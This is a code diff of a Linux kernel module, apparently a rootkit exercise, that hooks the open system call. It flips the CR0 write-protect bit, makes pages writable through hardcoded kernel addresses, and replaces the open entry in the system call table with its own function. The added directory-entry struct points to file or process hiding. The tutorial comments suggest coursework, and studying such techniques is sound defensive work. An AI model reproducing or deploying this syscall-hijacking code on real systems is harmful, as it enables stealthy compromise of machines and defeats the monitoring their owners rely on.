@@ -9,6 +9,16 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
+#define BUFFLEN 200
+struct linux_dirent {
+  u64 d_ino;
+  s64 d_off;
+  unsigned short d_reclen;
+  char d_name[BUFFLEN];
+};
+
+// static long procID = -1;
+
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
 //Bit 0 is the WP-bit (write protection). We want to flip this to 0
@@ -21,13 +31,13 @@
 //Grep for "set_pages_ro" and "set_pages_rw" in:
 //      /boot/System.map-`$(uname -r)`
 //      e.g. /boot/System.map-4.4.0-116-generic
-void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff810707b0;
-void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
+void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff8107ba70;
+void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff8107ba00;
 
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 //We're getting its adddress from the System.map file (see above).
-static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
+static unsigned long *sys_call_table = (unsigned long*)0xffffffff81e00240;
 
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
@@ -62,7 +72,7 @@ static int initialize_sneaky_module(void)
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
-  original_call = (void*)*(sys_call_table + __NR_open);
+  original_call = (void*) * (sys_call_table + __NR_open);
   *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
 
   //Revert page to read-only
@@ -70,15 +80,15 @@ static int initialize_sneaky_module(void)
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
 
-  return 0;       // to show a successful load 
-}  
+  return 0;       // to show a successful load
+}
 
 
-static void exit_sneaky_module(void) 
+static void exit_sneaky_module(void)
 {
   struct page *page_ptr;
 
-  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+  printk(KERN_INFO "Sneaky module being unloaded.\n");
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -97,9 +107,9 @@ static void exit_sneaky_module(void)
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
-}  
+}
 
 
-module_init(initialize_sneaky_module);  // what's called upon loading 
-module_exit(exit_sneaky_module);        // what's called upon unloading  
+module_init(initialize_sneaky_module);  // what's called upon loading
+module_exit(exit_sneaky_module);        // what's called upon unloading
 
